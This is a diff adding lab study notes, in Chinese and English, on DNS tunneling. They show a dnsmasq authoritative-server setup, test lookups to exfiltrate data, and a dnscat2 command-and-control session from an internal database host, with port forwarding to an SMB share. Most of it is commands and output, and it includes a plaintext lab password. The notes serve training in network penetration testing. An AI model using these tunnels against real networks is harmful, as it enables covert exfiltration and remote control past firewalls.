@@ -674,3 +674,324 @@ database_admin@pgdatabase01:~$ ls
 `%p` 代表 目標端口 (22，預設 SSH 端口)
 
 ## DNS Tunneling Theory and Practice
+DNS 是一種 foundational Internet protocols。
+DNS Tunneling attack 可分為兩種用途：
+- 資料外洩 (Exfiltration)：把 sensitive data 嵌入 DNS 查詢，送出網路防火牆。
+- 資料滲透 (Infiltration)：把 cmd 或惡意程式藏在 DNS 回應中，傳入受害網路。
+### DNS Tunneling Fundamentals
+- DNS 查詢流程
+    - Client 詢問 DNS [recursive resolver](https://en.wikipedia.org/wiki/Domain_Name_System#Recursive_and_caching_name_server) Server
+    PGDATABASE01 想存取 `www.example.com`，但不知道 IP (A record)，因此向 MULTISERVER03 查詢。
+        - DNS resolver 詢問 [Root name servers](https://en.wikipedia.org/wiki/Root_name_server)
+    MULTISERVER03 會向 Root DNS Server 查詢， Root 伺服器回應：「這是 `.com` 的域名，你應該去問 `.com` 的 TLD Server。」
+        - TLD Server 回應 ([Top-level domain](https://en.wikipedia.org/wiki/Top-level_domain))
+    `.com` 的 TLD Server 告訴 MULTISERVER03：「負責 `example.com` 的是哪一台 Authoritative Name Server。」
+        - [Authoritative name server](https://en.wikipedia.org/wiki/Name_server#Authoritative_name_server) 回應
+    MULTISERVER03 問 `example.com` 的 Authoritative name server：「請問 `www.example.com` 的 IP 是什麼？」\
+    Authoritative name server 回傳「9.10.11.12。」
+    - DNS Server 回應 Client
+    MULTISERVER03 把 `www.example.com` 的 IP 回傳給 PGDATABASE01，完成 DNS 解析。
+
+![image](https://hackmd.io/_uploads/H1mdyo8syg.png)
+
+[情境範例] \
+觀察 PGDATABASE01 和 FELINEAUTHORITY 之間交換的 DNS 封包:
+- FELINEAUTHORITY：這是網路內的 Authoritative name server，負責解析 feline.corp 的 DNS 查詢。 (`192.168.114.7`)
+- MULTISERVER03：這台伺服器充當 recursive resolver server，處理來自內部網路的 DNS 查詢。 (`192.168.114.64`)
+- PGDATABASE01：內部伺服器，無法直接存取外部網路，但能透過 MULTISERVER03 查詢 DNS。 (`10.4.114.215`)
+
+雖然 PGDATABASE01 不能直接連接到 FELINEAUTHORITY，但它可以連接到 MULTISERVER03。 MULTISERVER03 也配置為 PGDATABASE01 的 DNS 解析伺服器。
+![image](https://hackmd.io/_uploads/SkGsJ6Lo1x.png)
+> 我們現在有兩個 open shells：
+> 1. Kali > (Confluence Injection) > CONFLUENCE01 > (SSH remote port forward) > PGDATABASE01 (database_admin user)
+> 2. SSH directly into FELINEAUTHORITY (kali user)
+
+為了模擬真實 DNS setup，利用 [Dnsmasq](https://thekelleys.org.uk/dnsmasq/doc.html) 在 FELINEAUTHORITY 設定為 DNS server。
+#### 1. FELINEAUTHORITY 設定為 DNS 伺服器
+```
+┌──(chw㉿CHW)-[~/Chisel_x64]
+└─$ ssh kali@192.168.114.7                  
+The authenticity of host '192.168.114.7 (192.168.114.7)' can't be established.
+ED25519 key fingerprint is SHA256:O14upfQq8jpAJjHJq+d90VrMcd1t3O4pdDgSl0XNSUM.
+This key is not known by any other names.
+...
+Last login: Wed Mar 22 17:36:44 2023
+kali@felineauthority:~$ cd dns_tunneling
+kali@felineauthority:~/dns_tunneling$ cat dnsmasq.conf
+# Do not read /etc/resolv.conf or /etc/hosts
+no-resolv
+no-hosts
+
+# Define the zone
+auth-zone=feline.corp
+auth-server=feline.corp
+```
+> 設定 feline.corp 為 Authoritative Zone
+```
+kali@felineauthority:~/dns_tunneling$ sudo dnsmasq -C dnsmasq.conf -d
+[sudo] password for kali: 
+dnsmasq: started, version 2.89 cachesize 150
+dnsmasq: compile time options: IPv6 GNU-getopt DBus no-UBus i18n IDN2 DHCP DHCPv6 no-Lua TFTP conntrack ipset nftset auth cryptohash DNSSEC loop-detect inotify dumpfile
+dnsmasq: warning: no upstream servers configured
+dnsmasq: cleared cache
+
+```
+>`-C`：指定要使用的 config\
+>`-d`: 以 no-daemon mode，不會在背景執行
+#### 2. 使用 tcpdump 監聽 DNS request
+在 FELINEAUTHORITY 上監聽 UDP/53 以抓取 DNS 封包
+```
+kali@felineauthority:~$ sudo tcpdump -i ens192 udp port 53
+[sudo] password for kali: 
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on ens192, link-type EN10MB (Ethernet), snapshot length 262144 bytes
+```
+
+ 現在 tcpdump 正在監聽，且 Dnsmasq 也在 FELINEAUTHORITY 運作
+
+#### 3. PGDATABASE01 發送 DNS 查詢
+使用 resolvectl 檢查 DNS 設定
+```
+database_admin@pgdatabase01:~$ resolvectl status
+...             
+
+Link 5 (ens224)
+      Current Scopes: DNS        
+DefaultRoute setting: yes        
+       LLMNR setting: yes        
+...        
+  Current DNS Server: 10.4.114.64
+         DNS Servers: 10.4.114.64
+
+Link 4 (ens192)
+      Current Scopes: DNS        
+DefaultRoute setting: yes        
+       LLMNR setting: yes        
+...       
+  Current DNS Server: 10.4.114.64
+         DNS Servers: 10.4.114.64
+```
+> PGDATABASE01's DNS server is set to 10.4.114.64 (MULTISERVER03).
+
+透過 nslookup 查詢 `exfiltrated-data.feline.corp`
+```
+database_admin@pgdatabase01:~$ nslookup exfiltrated-data.feline.corp
+Server:		127.0.0.53
+Address:	127.0.0.53#53
+
+** server can't find exfiltrated-data.feline.corp: NXDOMAIN
+```
+#### 4. 監視 DNS request
+在 FELINEAUTHORITY 上，我們能夠看到 tcpdump 監測到的 DNS 封包，顯示 DNS 解析的過程：
+```
+tcpdump: 192.168.114.64.65122 > 192.168.114.4.domain: A? exfiltrated-data.feline.corp.
+```
+![image](https://hackmd.io/_uploads/SyJMGRUokg.png)
+
+#### 5. 測試 TXT 記錄來滲透資料
+在 FELINEAUTHORITY 上設定 TXT 記錄：
+```
+kali@felineauthority:~/dns_tunneling$ cat dnsmasq_txt.conf
+# Do not read /etc/resolv.conf or /etc/hosts
+no-resolv
+no-hosts
+
+# Define the zone
+auth-zone=feline.corp
+auth-server=feline.corp
+
+# TXT record
+txt-record=www.feline.corp,here's something useful!
+txt-record=www.feline.corp,here's something else less useful.
+
+kali@felineauthority:~/dns_tunneling$ sudo dnsmasq -C dnsmasq_txt.conf -d
+dnsmasq: started, version 2.88 cachesize 150
+dnsmasq: compile time options: IPv6 GNU-getopt DBus no-UBus i18n IDN2 DHCP DHCPv6 no-Lua TFTP conntrack ipset nftset auth cryptohash DNSSEC loop-detect inotify dumpfile
+dnsmasq: warning: no upstream servers configured
+dnsmasq: cleared cache
+```
+#### 6. PGDATABASE01 發送 DNS 查詢 txt，確認 Server 回應
+```
+database_admin@pgdatabase01:~$ nslookup -type=txt www.feline.corp
+Server:		192.168.114.64
+Address:	192.168.114.64#53
+
+Non-authoritative answer:
+www.feline.corp	text = "here's something useful!"
+www.feline.corp	text = "here's something else less useful."
+
+Authoritative answers can be found from:
+
+database_admin@pgdatabase01:~$
+```
+### DNS Tunneling with dnscat2
+如何使用 dnscat2 透過 DNS Tunneling 來滲透內網並傳輸資料，以及如何利用 dnscat2 進行 Port Forwarding
+> DNS subdomain queries > exfiltrate data (竊取)\
+> TXT (and other) records >  infiltrate data (滲透)
+
+- [dnscat2](https://github.com/iagox86/dnscat2) 建立連線
+    - 伺服器端 (FELINEAUTHORITY)：
+        - 在 FELINEAUTHORITY（Authoritative DNS server）上 啟動 dnscat2-server，監聽 UDP 53 端口。
+        - 使用 tcpdump 監視 DNS 流量。
+        - 伺服器會解析來自 Target Machine (PGDATABASE01) 的 DNS 請求。
+    - 客戶端 (PGDATABASE01)：
+        - 在 PGDATABASE01 上執行 dnscat2-client，將 feline.corp 當作 DNS 查詢的目標。
+        - 連線後，伺服器與客戶端都會顯示一組 驗證字串（例如："Annoy Mona Spiced Outran Stump Visas"），用來確保 未被中間人攻擊篡改。
+
+#### 1. 啟動並監控 dnscat2-server 流量 
+使用 tcpdump 檢查來自 FELINEAUTHORITY 53 port 的流量
+```
+kali@felineauthority:~$ sudo tcpdump -i ens192 udp port 53
+[sudo] password for kali: 
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on ens192, link-type EN10MB (Ethernet), snapshot length 262144 bytes
+```
+啟動 dnscat2-server
+```
+kali@felineauthority:~$ dnscat2-server feline.corp
+
+New window created: 0
+New window created: crypto-debug
+Welcome to dnscat2! Some documentation may be out of date.
+
+auto_attach => false
+history_size (for new windows) => 1000
+Security policy changed: All connections must be encrypted
+New window created: dns1
+Starting Dnscat2 DNS server on 0.0.0.0:53
+[domains = feline.corp]...
+
+Assuming you have an authoritative DNS server, you can run
+the client anywhere with the following (--secret is optional):
+
+  ./dnscat --secret=c6cbfa40606776bf86bf439e5eb5b8e7 feline.corp
+
+To talk directly to the server without a domain name, run:
+
+  ./dnscat --dns server=x.x.x.x,port=53 --secret=c6cbfa40606776bf86bf439e5eb5b8e7
+
+Of course, you have to figure out <server> yourself! Clients
+will connect directly on UDP port 53.
+
+dnscat2>
+```
+> 監聽所有介面的 DNS Server，等待 dnscat2-client 連線\
+> `feline.corp`當作唯一的參數
+
+#### 2. 在 Target machine 執行 dnscat2-client
+在 PGDATABASE01 執行 dnscat2-client， dnscat2-client 會發送 DNS 請求到 feline.corp。
+```
+database_admin@pgdatabase01:~$ cd dnscat/
+database_admin@pgdatabase01:~/dnscat$ ./dnscat feline.corp
+Creating DNS driver:
+ domain = feline.corp
+ host   = 0.0.0.0
+ port   = 53
+ type   = TXT,CNAME,MX
+ server = 127.0.0.53
+
+Encrypted session established! For added security, please verify the server also displays this string:
+
+Annoy Mona Spiced Outran Stump Visas 
+
+Session established!
+```
+
+如果連線成功，Client 和 Server 會顯示相同的驗證字串，用來確認連線未被篡改。
+
+#### 3. tcpdump 監視 DNS Tunnel 的流量
+```
+kali@felineauthority:~$ sudo tcpdump -i ens192 udp port 53
+[sudo] password for kali: 
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on ens192, link-type EN10MB (Ethernet), snapshot length 262144 bytes
+...
+07:22:14.732538 IP 192.168.118.4.domain > 192.168.50.64.51077: 29066 1/0/0 TXT "b40d0140b6a895ada18b30ffff0866c42a" (111)
+07:22:15.387435 IP 192.168.50.64.65022 > 192.168.118.4.domain: 65401+ CNAME? bbcd0158e09a60c01861eb1e1178dea7ff.feline.corp. (64)
+07:22:15.388087 IP 192.168.118.4.domain > 192.168.50.64.65022: 65401 1/0/0 CNAME a2890158e06d79fd12c560ffff57240ba6.feline.corp. (124)
+07:22:15.741752 IP 192.168.50.64.50500 > 192.168.118.4.domain: 6144+ [1au] CNAME? 38b20140b6a4ccb5c3017c19c29f49d0db.feline.corp. (75)
+07:22:15.742436 IP 192.168.118.4.domain > 192.168.50.64.50500: 6144 1/0/0 CNAME e0630140b626a6fa2b82d8ffff0866c42a.feline.corp. (124)
+07:22:16.397832 IP 192.168.50.64.50860 > 192.168.118.4.domain: 16449+ MX? 8a670158e004d2f8d4d5811e1241c3c1aa.feline.corp. (64)
+07:22:16.398299 IP 192.168.118.4.domain > 192.168.50.64.50860: 16449 1/0/0 MX 385b0158e0dbec12770c9affff57240ba6.feline.corp. 10 (126)
+07:22:16.751880 IP 192.168.50.64.49350 > 192.168.118.4.domain: 5272+ [1au] MX? 68fd0140b667aeb6d6d26119c3658f0cfa.feline.corp. (75)
+07:22:16.752376 IP 192.168.118.4.domain > 192.168.50.64.49350: 5272 1/0/0 MX d01f0140b66950a355a6bcffff0866c42a.feline.corp. 10 (126)
+
+```
+可以看到 dnscat2 正在使用 TXT、CNAME、MX queries and responses。
+
+#### 4. dnscat2-server 連線後 interacting cmd
+- windows 列出所有 active
+```
+dnscat2> windows
+0 :: main [active]
+  crypto-debug :: Debug window for crypto stuff [*]
+  dns1 :: DNS Driver running on 0.0.0.0:53 domains = feline.corp [*]
+  1 :: command (pgdatabase01) [encrypted, NOT verified] [*]
+dnscat2> window -i 1
+New window created: 1
+history_size (session) => 1000
+Session 1 security: ENCRYPTED BUT *NOT* VALIDATED
+For added security, please ensure the client displays the same string:
+
+>> Annoy Mona Spiced Outran Stump Visas
+This is a command session!
+
+That means you can enter a dnscat2 command such as
+'ping'! For a full list of clients, try 'help'.
+
+command (pgdatabase01) 1> ?
+
+Here is a list of commands (use -h on any of them for additional help):
+* clear
+* delay
+* download
+* echo
+* exec
+* help
+* listen
+* ping
+* quit
+* set
+* shell
+* shutdown
+* suspend
+* tunnels
+* unset
+* upload
+* window
+* windows
+command (pgdatabase01) 1>
+```
+- listen 設定監聽端口
+可以使用 listen 在 dnscat2 Server 上設定一個監聽端口，並透過 DNS Tunnel 推送 TCP 流量，在那裡它將 decapsulated 並推送到我們指定的內容。
+```
+command (pgdatabase01) 1> listen --help
+Error: The user requested help
+Listens on a local port and sends the connection out the other side (like ssh
+	-L). Usage: listen [<lhost>:]<lport> <rhost>:<rport>
+  --help, -h:   Show this message
+```
+
+#### 5. 嘗試透過 DNS Tunnel 連接到 SMB
+連接到 HRSHARES 上的 SMB 端口，在 FELINEAUTHORITY 上監聽 4455 port，並在 HRSHARES 上轉送至 445。
+```
+command (pgdatabase01) 1> listen 127.0.0.1:4455 172.16.2.11:445
+Listening on 127.0.0.1:4455, sending connections to 172.16.2.11:445
+command (pgdatabase01) 1> 
+```
+```
+kali@felineauthority:~$ smbclient -p 4455 -L //127.0.0.1 -U hr_admin --password=Welcome1234
+Password for [WORKGROUP\hr_admin]:
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+    	scripts         Disk
+        Users           Disk      
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 192.168.50.63 failed (Error NT_STATUS_CONNECTION_REFUSED)
+Unable to connect with SMB1 -- no workgroup available
+```
+# The Metasploit Framework
